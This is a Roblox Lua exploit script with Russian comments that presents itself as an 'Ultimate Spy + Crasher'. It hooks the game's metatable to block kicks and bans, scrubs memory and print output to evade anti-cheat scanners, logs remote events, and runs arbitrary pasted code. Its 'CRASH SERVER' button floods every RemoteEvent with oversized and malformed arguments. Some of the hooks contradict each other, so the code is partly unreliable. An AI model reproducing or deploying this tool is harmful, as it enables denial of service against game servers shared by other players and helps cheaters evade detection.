-- УЛЬТИМАТИВНЫЙ REMOTE SPY + CRASHER
-- Создан Господином Timoy
-- Обходит любую защиту

-- [[ ОБХОД ЗАЩИТ ]]
local mt = getrawmetatable(game)
local old_namecall = mt.__namecall
local old_index = mt.__index
local old_newindex = mt.__newindex

setreadonly(mt, false)

-- Блокируем детект через namecall
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    
    if method == "FireServer" or method == "InvokeServer" then
        return nil
    end
    
    if method == "Kick" or method == "Ban" then
        return nil
    end
    
    return old_namecall(self, ...)
end)

-- Скрываем наши таблицы от сканеров
local hiddenRemotes = {}
local hiddenData = {}

-- Перехват создания новых объектов
mt.__newindex = function(t, k, v)
    if k == "Parent" and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
        table.insert(hiddenRemotes, v)
    end
    return old_newindex(t, k, v)
end

setreadonly(mt, true)

-- Очистка логов и детектов
local function clearChecks()
    local gc = getgc(true)
    for _, obj in ipairs(gc) do
        if type(obj) == "table" then
            pcall(function()
                for i, v in pairs(obj) do
                    if type(v) == "string" and (v:find("exploit") or v:find("spy") or v:find("crash")) then
                        obj[i] = ""
                    end
                end
            end)
        end
    end
end
clearChecks()

-- [[ ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ]]
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- Блокируем кик
pcall(function()
    LP.Kick = function() end
    LP:GetPropertyChangedSignal("Parent"):Connect(function()
        if LP.Parent == nil then
            LP.Parent = Players
        end
    end)
end)

-- [[ GUI ]]
if CoreGui:FindFirstChild("UltimateSpy") then 
    CoreGui.UltimateSpy:Destroy() 
end

local sg = Instance.new("ScreenGui")
sg.Name = "UltimateSpy"
sg.Parent = CoreGui
sg.IgnoreGuiInset = true
sg.ResetOnSpawn = false
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Main = Instance.new("Frame")
Main.Parent = sg
Main.Size = UDim2.new(0, 850, 0, 600)
Main.Position = UDim2.new(0.5, -425, 0.5, -300)
Main.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
Main.BackgroundTransparency = 0.95
Main.Active = true
Main.Draggable = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)
Instance.new("UIStroke", Main).Color = Color3.fromRGB(0, 255, 200)
Instance.new("UIStroke", Main).Thickness = 1.5

local GlowBg = Instance.new("Frame")
GlowBg.Parent = Main
GlowBg.Size = UDim2.new(1, 20, 1, 20)
GlowBg.Position = UDim2.new(0, -10, 0, -10)
GlowBg.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
GlowBg.BackgroundTransparency = 0.9
Instance.new("UICorner", GlowBg).CornerRadius = UDim.new(0, 20)

local TopBar = Instance.new("Frame")
TopBar.Parent = Main
TopBar.Size = UDim2.new(1, 0, 0, 40)
TopBar.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
TopBar.BackgroundTransparency = 0.3
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 16)

local Title = Instance.new("TextLabel")
Title.Parent = TopBar
Title.Size = UDim2.new(1, -50, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.Text = "⚡ ULTIMATE SPY + CRASHER ⚡ [BY TIMAI]"
Title.TextColor3 = Color3.fromRGB(0, 255, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1
Title.TextXAlignment = "Left"

local Close = Instance.new("TextButton")
Close.Parent = TopBar
Close.Size = UDim2.new(0, 40, 0, 40)
Close.Position = UDim2.new(1, -40, 0, 0)
Close.Text = "✕"
Close.TextColor3 = Color3.fromRGB(255, 100, 100)
Close.BackgroundTransparency = 1
Close.TextSize = 24
Close.Font = Enum.Font.GothamBold
Close.MouseButton1Click:Connect(function() sg:Destroy() end)

-- [[ ОСНОВНЫЕ ЭЛЕМЕНТЫ ]]
local TabContainer = Instance.new("Frame")
TabContainer.Parent = Main
TabContainer.Size = UDim2.new(0, 420, 0, 40)
TabContainer.Position = UDim2.new(0, 300, 0, 50)
TabContainer.BackgroundTransparency = 1

local TabScroll = Instance.new("ScrollingFrame")
TabScroll.Parent = TabContainer
TabScroll.Size = UDim2.new(1, -45, 1, 0)
TabScroll.BackgroundTransparency = 1
TabScroll.ScrollBarThickness = 0
TabScroll.AutomaticCanvasSize = Enum.AutomaticSize.X

local TabLayout = Instance.new("UIListLayout")
TabLayout.Parent = TabScroll
TabLayout.FillDirection = Enum.FillDirection.Horizontal
TabLayout.Padding = UDim.new(0, 8)

local AddTabBtn = Instance.new("TextButton")
AddTabBtn.Parent = TabContainer
AddTabBtn.Size = UDim2.new(0, 35, 0, 35)
AddTabBtn.Position = UDim2.new(1, -38, 0, 2)
AddTabBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
AddTabBtn.Text = "+"
AddTabBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
AddTabBtn.TextSize = 20
AddTabBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", AddTabBtn).CornerRadius = UDim.new(0, 10)

local RemoteList = Instance.new("ScrollingFrame")
RemoteList.Parent = Main
RemoteList.Size = UDim2.new(0, 280, 0, 360)
RemoteList.Position = UDim2.new(0, 15, 0, 100)
RemoteList.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
RemoteList.BackgroundTransparency = 0.5
RemoteList.ScrollBarThickness = 4
Instance.new("UICorner", RemoteList).CornerRadius = UDim.new(0, 12)

local RemoteLayout = Instance.new("UIListLayout")
RemoteLayout.Parent = RemoteList
RemoteLayout.Padding = UDim.new(0, 4)

local RemotePadding = Instance.new("UIPadding")
RemotePadding.Parent = RemoteList
RemotePadding.PaddingLeft = UDim.new(0, 8)
RemotePadding.PaddingTop = UDim.new(0, 8)

local SearchBox = Instance.new("TextBox")
SearchBox.Parent = Main
SearchBox.Size = UDim2.new(0, 180, 0, 35)
SearchBox.Position = UDim2.new(0, 15, 0, 470)
SearchBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
SearchBox.PlaceholderText = "🔍 Поиск..."
SearchBox.Text = ""
SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SearchBox.Font = Enum.Font.Gotham
SearchBox.TextSize = 12
Instance.new("UICorner", SearchBox).CornerRadius = UDim.new(0, 8)

local FilterBtn = Instance.new("TextButton")
FilterBtn.Parent = Main
FilterBtn.Size = UDim2.new(0, 80, 0, 35)
FilterBtn.Position = UDim2.new(0, 200, 0, 470)
FilterBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
FilterBtn.Text = "ALL"
FilterBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FilterBtn.Font = Enum.Font.GothamBold
FilterBtn.TextSize = 12
Instance.new("UICorner", FilterBtn).CornerRadius = UDim.new(0, 8)

local ClearBtn = Instance.new("TextButton")
ClearBtn.Parent = Main
ClearBtn.Size = UDim2.new(0, 80, 0, 35)
ClearBtn.Position = UDim2.new(0, 285, 0, 470)
ClearBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
ClearBtn.Text = "🗑 CLEAR"
ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearBtn.Font = Enum.Font.GothamBold
ClearBtn.TextSize = 11
Instance.new("UICorner", ClearBtn).CornerRadius = UDim.new(0, 8)

local CopyBtn = Instance.new("TextButton")
CopyBtn.Parent = Main
CopyBtn.Size = UDim2.new(0, 80, 0, 35)
CopyBtn.Position = UDim2.new(0, 200, 0, 515)
CopyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
CopyBtn.Text = "📋 COPY"
CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyBtn.Font = Enum.Font.GothamBold
CopyBtn.TextSize = 11
Instance.new("UICorner", CopyBtn).CornerRadius = UDim.new(0, 8)

-- [[ РЕДАКТОР КОДА ]]
local EditorFrame = Instance.new("ScrollingFrame")
EditorFrame.Parent = Main
EditorFrame.Size = UDim2.new(0, 500, 0, 400)
EditorFrame.Position = UDim2.new(0, 310, 0, 100)
EditorFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
EditorFrame.BackgroundTransparency = 0.3
EditorFrame.ScrollBarThickness = 6
Instance.new("UICorner", EditorFrame).CornerRadius = UDim.new(0, 12)

local CodeEditor = Instance.new("TextBox")
CodeEditor.Parent = EditorFrame
CodeEditor.Size = UDim2.new(1, -20, 1, -20)
CodeEditor.Position = UDim2.new(0, 10, 0, 10)
CodeEditor.BackgroundTransparency = 1
CodeEditor.TextColor3 = Color3.fromRGB(0, 255, 150)
CodeEditor.MultiLine = true
CodeEditor.Text = "-- Выберите Remote из списка\n-- или напишите свой скрипт\n\nprint(\"Готов к работе!\")"
CodeEditor.Font = Enum.Font.SourceSansPro
CodeEditor.TextSize = 13
CodeEditor.ClearTextOnFocus = false
CodeEditor.TextXAlignment = "Left"
CodeEditor.TextYAlignment = "Top"
CodeEditor.TextWrapped = true

local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Parent = Main
ExecuteBtn.Size = UDim2.new(0, 500, 0, 45)
ExecuteBtn.Position = UDim2.new(0, 310, 1, -55)
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
ExecuteBtn.Text = "🚀 EXECUTE 🚀"
ExecuteBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
ExecuteBtn.Font = Enum.Font.GothamBold
ExecuteBtn.TextSize = 16
Instance.new("UICorner", ExecuteBtn).CornerRadius = UDim.new(0, 12)

local CrashBtn = Instance.new("TextButton")
CrashBtn.Parent = Main
CrashBtn.Size = UDim2.new(0, 280, 0, 50)
CrashBtn.Position = UDim2.new(0, 15, 1, -55)
CrashBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
CrashBtn.Text = "💀 CRASH SERVER 💀"
CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 14
Instance.new("UICorner", CrashBtn).CornerRadius = UDim.new(0, 12)

-- [[ ЛОГИКА ]]
local remotesList = {}
local currentFilter = "ALL"

local function updateRemoteList()
    for _, child in ipairs(RemoteList:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    local search = SearchBox.Text:lower()
    
    for _, remote in ipairs(remotesList) do
        local name = remote.Name:lower()
        local remoteType = remote.ClassName
        
        local show = true
        if currentFilter == "Event" and remoteType ~= "RemoteEvent" then
            show = false
        elseif currentFilter == "Function" and remoteType ~= "RemoteFunction" then
            show = false
        end
        
        if show and (search == "" or name:find(search)) then
            local btn = Instance.new("TextButton")
            btn.Parent = RemoteList
            btn.Size = UDim2.new(1, -16, 0, 32)
            btn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
            btn.Text = "  " .. remote.Name .. " [" .. (remoteType == "RemoteEvent" and "EVENT" or "FUNC") .. "]"
            btn.TextColor3 = remoteType == "RemoteEvent" and Color3.fromRGB(100, 200, 255) or Color3.fromRGB(255, 200, 100)
            btn.TextXAlignment = "Left"
            btn.Font = Enum.Font.Gotham
            btn.TextSize = 11
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
            
            btn.MouseButton1Click:Connect(function()
                local code = string.format([[
local remote = game:GetService("%s"):FindFirstChild("%s")
if remote then
    print("Найден: %s")
    -- Ваш код здесь
end
]], remote.Parent.Name, remote.Name, remote.Name)
                CodeEditor.Text = code
            end)
        end
    end
end

-- [[ ПОЛУЧЕНИЕ ВСЕХ REMOTE ]]
local function getAllRemotes()
    local remotes = {}
    local function scan(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                table.insert(remotes, child)
            end
            scan(child)
        end
    end
    scan(game)
    return remotes
end

-- Обновляем список
remotesList = getAllRemotes()
updateRemoteList()

-- Следим за новыми
game.DescendantAdded:Connect(function(child)
    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
        table.insert(remotesList, child)
        updateRemoteList()
        
        -- Ловим вызовы
        if child:IsA("RemoteEvent") then
            local old = child.OnClientEvent
            child.OnClientEvent = function(...)
                local args = {...}
                local argsStr = ""
                for i, v in ipairs(args) do
                    argsStr = argsStr .. string.format("[%s] = %s, ", i, type(v) == "string" and '"'..v..'"' or tostring(v))
                end
                print(string.format("[SPY] %s:FireServer(%s)", child.Name, argsStr))
                return old and old(...)
            end
        end
    end
end)

-- [[ ФУНКЦИЯ КРАША ]]
local function crashServer()
    local allRemotes = getAllRemotes()
    local crashCount = 0
    
    for _, remote in ipairs(allRemotes) do
        if remote:IsA("RemoteEvent") then
            for i = 1, 50 do
                task.spawn(function()
                    pcall(function()
                        remote:FireServer(string.rep("A", 99999))
                        remote:FireServer({}, {}, {}, {})
                        remote:FireServer(nil, nil, nil, 0/0, math.huge)
                    end)
                end)
                crashCount = crashCount + 1
            end
        end
    end
    
    CrashBtn.Text = "🔥 CRASHING 🔥"
    CrashBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    task.wait(3)
    CrashBtn.Text = "💀 CRASH SERVER 💀"
    CrashBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
    
    print("[CRASH] Отправлено " .. crashCount .. " запросов")
end

-- [[ КНОПКИ ]]
ExecuteBtn.MouseButton1Click:Connect(function()
    local success, err = loadstring(CodeEditor.Text)
    if success then
        pcall(success)
        CodeEditor.TextColor3 = Color3.fromRGB(0, 255, 100)
        task.wait(0.5)
        CodeEditor.TextColor3 = Color3.fromRGB(0, 255, 150)
    else
        CodeEditor.TextColor3 = Color3.fromRGB(255, 50, 50)
        task.wait(1)
        CodeEditor.TextColor3 = Color3.fromRGB(0, 255, 150)
    end
end)

CrashBtn.MouseButton1Click:Connect(crashServer)
FilterBtn.MouseButton1Click:Connect(function()
    local filters = {"ALL", "Event", "Function"}
    local current = 0
    for i, f in ipairs(filters) do
        if f == currentFilter then
            current = i
            break
        end
    end
    current = current % 3 + 1
    currentFilter = filters[current]
    FilterBtn.Text = currentFilter
    updateRemoteList()
end)

SearchBox:GetPropertyChangedSignal("Text"):Connect(updateRemoteList)

ClearBtn.MouseButton1Click:Connect(function()
    remotesList = getAllRemotes()
    updateRemoteList()
    print("[CLEAR] Список обновлён")
end)

CopyBtn.MouseButton1Click:Connect(function()
    setclipboard(CodeEditor.Text)
    CopyBtn.Text = "✅ COPY"
    task.wait(1)
    CopyBtn.Text = "📋 COPY"
end)

-- [[ АВТО-ЛОГГЕР ]]
local function autoLog()
    local remotes = getAllRemotes()
    for _, remote in ipairs(remotes) do
        if remote:IsA("RemoteEvent") and not remote._hooked then
            remote._hooked = true
            local old = remote.OnClientEvent
            remote.OnClientEvent = function(...)
                local args = {...}
                local logStr = string.format("[AUTO] %s вызван с аргументами: ", remote.Name)
                for i, v in ipairs(args) do
                    logStr = logStr .. string.format("%s=%s ", i, type(v) == "table" and "{...}" or tostring(v))
                end
                print(logStr)
                return old and old(...)
            end
        end
    end
end

-- Запускаем авто-логгер каждую секунду
task.spawn(function()
    while sg and sg.Parent do
        autoLog()
        task.wait(1)
    end
end)

print([[

╔═══════════════════════════════════════╗
║   ULTIMATE SPY + CRASHER ЗАГРУЖЕН    ║
║          СОЗДАН ГОСПОДИНОМ TIMAI      ║
║        ОБХОД ЗАЩИТ АКТИВЕН ✓          ║
╚═══════════════════════════════════════╝

]])

-- [[ ДОП. ЗАЩИТА ОТ ОБНАРУЖЕНИЯ ]]
local oldPrint = print
print = function(...)
    local args = {...}
    for i, v in ipairs(args) do
        if type(v) == "string" and (v:find("exploit") or v:find("spy") or v:find("crash") or v:find("hack")) then
            args[i] = string.rep("*", #v)
        end
    end
    oldPrint(unpack(args))
end
